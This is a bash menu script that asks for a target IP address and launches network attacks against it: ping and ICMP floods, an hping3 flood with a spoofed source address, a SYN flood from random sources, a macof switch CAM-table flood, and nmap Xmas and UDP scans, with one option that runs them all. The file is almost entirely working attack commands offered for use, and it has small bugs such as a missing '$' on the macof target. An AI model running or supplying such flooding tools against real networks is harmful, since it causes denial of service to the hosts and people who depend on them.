#!/bin/bash

#Bash menu script
#get IP address from user input
# read IP address

echo " enter ip address: "
read ip_add

echo " you entered this IP: "
echo $ip_add

#path
MYPATH=/home/Desktop/scripts
echo "The directory is: "
echo $MYPATH


#ip_add=$(IP_add)

function Xmas-Scan(){
    echo ""
    echo "you choose Xmas-Scan"
    #Xmas Scan
   # hping3 $ip_add --flood --rand-source --destport 22 -c 250 --syn --ack --fin --rst --push --urg --xmas
    nmap -sX -p 22 $ip_add
    echo "DoS Attack - Xmas Scanning; if you want to stop scanning, kill the process by pressing Ctrl+X for more options available"
}
function ICMP-Flood(){
    echo ""
    echo "you choose ICMP/Ping Flood - random source IP "
    ping -f -s 56500 $ip_add
}

function ICMP-Spoof(){
    echo ""
    echo "you choose ICMP Spoof - flooding"
    echo "Enter (Spoof) IP address"
    read sp_ip 
    hping3 --icmp --flood $ip_add -a $sp_ip
}

function SYN-Flood(){
    echo ""
    echo "you choose SYN flooding"
    hping3 $ip_add --flood --rand-source --syn --ack
}

function MAC-Flood(){
    echo ""
    echo "you choose MAC flooding -filled up CAM table at the switch"
    echo "Enter detination IP address"
    read dt_ip
    macof -i eth0 -d dt_ip -n 50
}

function UDP-Scan(){
    echo ""
    echo "you choose UDP flooding"
    nmap -sUV -T4 $ip_add
}

function all_checks(){
    Xmas-Scan
    ICMP-Flood
    ICMP-Spoof   
    SYN-Flood
    MAC-Flood
    UDP-Scan
}

##
# Color Variables
##
green='\e[32m'
blue='\e[34m'
#clear='\e[0m"

##
# Color Functions

##

ColorGreen(){
    echo -ne $green$1$clear
}

ColorBlue(){
    echo -ne $blue$1$clear
}

menu(){

    echo -ne "
    Choose Option Menu
    $(ColorGreen '1)') Xmas-Scan
    $(ColorGreen '2)') ICMP-Flood    
    $(ColorGreen '3)') ICMP-Spoof
    $(ColorGreen '4)') SYN-Flood
    $(ColorGreen '5)') MAC-Flood
    $(ColorGreen '6)') UDP-Scan
    $(ColorGreen '7)') Check All
    $(ColorGreen '0)') Exit
    $(ColorBlue 'Choose an option:')"

    read a
    case $a in
        1) Xmas-Scan ; menu ;;
	2) ICMP-Flood ; menu ;;
	3) ICMP-Spoof ; menu ;;
	4) SYN-Flood ; menu ;;
	5) MAC-Flood ; menu ;;
	6) UDP-Scan ; menu ;;
	7) all_checks ; menu ;;
        0) exit 0 ;;
        *) echo -e $red"Wrong option."$clear;WrongCommand;;
    esac
}

#Call the menu function
menu

#fi
